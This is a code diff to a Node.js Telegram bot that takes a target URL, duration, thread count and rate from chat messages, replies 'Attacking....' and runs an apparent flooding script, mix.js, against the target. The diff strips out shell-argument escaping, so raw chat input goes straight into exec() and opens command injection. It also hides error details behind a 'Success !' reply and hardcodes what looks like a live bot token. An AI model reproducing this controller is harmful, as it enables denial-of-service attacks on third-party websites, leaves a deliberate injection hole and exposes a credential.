@@ -1,8 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
-const escapeShellArg = require('shell-escape'); // Utility for escaping shell arguments
 
-// Replace with your Telegram bot token from environment variables
+// Replace with your Telegram bot token
 const token = '7220570795:AAGrXxndOJMNNGloJS5Fkl_A8L2QDIBW-jk';
 
 // Initialize bot with the token
@@ -40,22 +39,16 @@ bot.on('message', (msg) => {
 
     // Check if the message format is correct
     if (args.length === 5 && url && time && thread && rate) {
-      // Escape arguments to prevent command injection
-      const escapedUrl = escapeShellArg([url]);
-      const escapedTime = escapeShellArg([time]);
-      const escapedThread = escapeShellArg([thread]);
-      const escapedRate = escapeShellArg([rate]);
-
       bot.sendMessage(chatId, 'Attacking....');
-      exec(`node mix.js ${escapedUrl} ${escapedTime} ${escapedThread} ${escapedRate}`, (error, stdout, stderr) => {
+      exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
         if (error) {
           console.error(`Error: ${error.message}`);
-          bot.sendMessage(chatId, `Error: ${error.message}`);
+          bot.sendMessage(chatId, 'Error');
           return;
         }
         if (stderr) {
           console.error(`stderr: ${stderr}`);
-          bot.sendMessage(chatId, `stderr: ${stderr}`);
+          bot.sendMessage(chatId, 'Success !');
           return;
         }
         // Display stdout output if successful
